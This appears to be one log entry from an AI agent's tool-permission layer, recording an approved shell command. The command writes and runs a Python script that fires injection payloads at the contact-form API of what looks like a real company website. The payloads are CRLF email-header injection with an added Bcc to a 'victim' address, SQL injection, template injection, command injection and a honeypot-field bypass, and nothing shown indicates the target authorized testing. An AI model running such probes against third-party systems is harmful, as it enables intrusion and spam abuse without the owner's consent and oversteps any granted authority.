{"ts": 1790760262.459268, "decision_id": "8067ca26675d", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work/w18 && cat > hdr.py <<'PY'\nimport subprocess,time\nUA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'\nB='https://www.infinitycapital.bh'\ndef post(d):\n    args=['curl','-s','-w','\\n%{http_code}','-A',UA,'-X','POST']\n    for k,v in d.items(): args+=['-F',f'{k}={v}']\n    args+=[B+'/api/send']\n    p=subprocess.run(args,capture_output=True,text=True)\n    body,code=p.stdout.rsplit('\\n',1); return code,body[:300]\ndef mk(**kw):\n    d={'fname':'Test','lname':'User','areacode':'973','tel':'5551234','cname':'Test','subject':'Enquiry','msg':'Hello','check':'','targets':'x@y.z'}\n    d.update(kw); return d\nfor lbl,kw in [\n ('check=1 (honeypot bypass)',{'check':'1'}),\n ('cname crlf',{'cname':'Attacker\\r\\nBcc: victim@x.y'}),\n ('fname crlf',{'fname':'A\\r\\nX-Injected: 1'}),\n ('subject crlf',{'subject':'S\\r\\nContent-Type: text/html'}),\n ('msg sqli',{'msg':\"' OR 1=1--\"}),\n ('msg ssti',{'msg':'{{7*7}} ${7*7} <%= 7*7 %>'}),\n ('msg cmdi',{'msg':'x;id;$(id);`id`'}),\n]:\n    c,b=post(mk(**kw)); print(f'{lbl:28} {c} {b[:200]}'); time.sleep(2)\nPY\npython3 hdr.py"}
